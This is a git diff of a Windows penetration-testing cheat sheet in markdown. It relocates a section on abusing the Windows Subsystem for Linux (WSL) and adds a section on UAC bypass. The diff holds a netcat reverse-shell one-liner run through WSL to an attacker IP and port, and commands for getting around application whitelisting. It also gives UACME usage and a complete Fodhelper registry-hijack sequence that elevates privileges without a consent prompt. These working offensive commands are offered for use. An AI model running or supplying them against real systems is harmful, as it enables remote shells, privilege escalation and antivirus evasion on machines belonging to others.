@@ -12,8 +12,9 @@
 	* [Just Enough Admin](#Just-Enough-Admin)
 * [Windows Defender](#Windows-Defender)
 * [AV Bypass](#AV-Bypass)
+  * [Windows Subsystem for Linux WSL](#Windows-Subsystem-for-Linux-WSL)
 * [Privileges](#Privileges)
-* [Windows Subsystem for Linux WSL](#Windows-Subsystem-for-Linux-WSL)
+* [UAC Bypass](#UAC-bypass)
 
 ## General
 #### Get all GPO's applied to a machine
@@ -451,6 +452,25 @@ pyinstaller.exe --onefile .\CVE-2021-1675.py
 pyarmor pack --clean -e "--onefile " .\CVE-2021-1675.py
 ```
 
+### Windows Subsystem for Linux WSL
+- AVs which do not use Pico process APIs have no visibility of the processes executed using WSL. This provides better chances of bypass.
+- With the additional Linux tooling included (like Python), WSL increases the attack surface of a machine and the opportunities to abuse the new functionality.
+
+#### Netcat shell
+```
+wsl.exe mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc <IP> <PORT> 1>/tmp/backpipe
+```
+
+#### Bypass whitelisting
+- In both the above cases, the Windows application will have:
+  – Same permissions as the WSL process. 
+  – Run as the current Windows user.
+  – Uses the working directory as the WSL command prompt. That is we can access the Windows file system from WSL.
+```
+bash.exe -c cmd.exe
+wsl.exe cmd.exe
+```
+
 ## Privileges
 
 #### Check current privileges
@@ -487,21 +507,34 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "Loc
 Get-service LanmanServer | restart-service -verbose
 ```
 
-## Windows Subsystem for Linux WSL
-- AVs which do not use Pico process APIs have no visibility of the processes executed using WSL. This provides better chances of bypass.
-- With the additional Linux tooling included (like Python), WSL increases the attack surface of a machine and the opportunities to abuse the new functionality.
+## UAC bypass
+- A UAC bypass is a technique by which an application can go from Medium to High Integrity without prompting for consent.
+- Tool: https://github.com/hfiref0x/UACME
+- Guide on how to build: https://ad-lab.gitbook.io/building-a-windows-ad-lab/vulnerabilities-and-misconfigurations-and-attacks/misc/page-3-4
 
-#### Netcat shell
+ ```
+ .\Akagi64.exe <METHOD> <EXECUTABLE>
+ .\Akagi64.exe 34 cmd.exe
+ ```
+ 
+### Manual UAC bypass
+- https://atomicredteam.io/defense-evasion/T1548.002/
+ 
+#### Fodhelper
+- Can also use ```C:\Windows\System32\cmd.exe /c powershell.exe```
 ```
-wsl.exe mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc <IP> <PORT> 1>/tmp/backpipe
+New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
+New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
+Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "<PATH TO EXE>" -Force
+Start-Process "C:\Windows\System32\fodhelper.exe"
+ 
+# Cleanup
+Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
+```
+ 
+#### Check current UAC configuration
+- The default configuration for UAC is Prompt for consent for non-Windows binaries, but can also have different settings such as Prompt for credentials, Prompt for consent and Elevate without prompting.
+```
+Seatbelt.exe uac
 ```
 
-#### Bypass whitelisting
-- In both the above cases, the Windows application will have:
-  – Same permissions as the WSL process. 
-  – Run as the current Windows user.
-  – Uses the working directory as the WSL command prompt. That is we can access the Windows file system from WSL.
-```
-bash.exe -c cmd.exe
-wsl.exe cmd.exe
-```
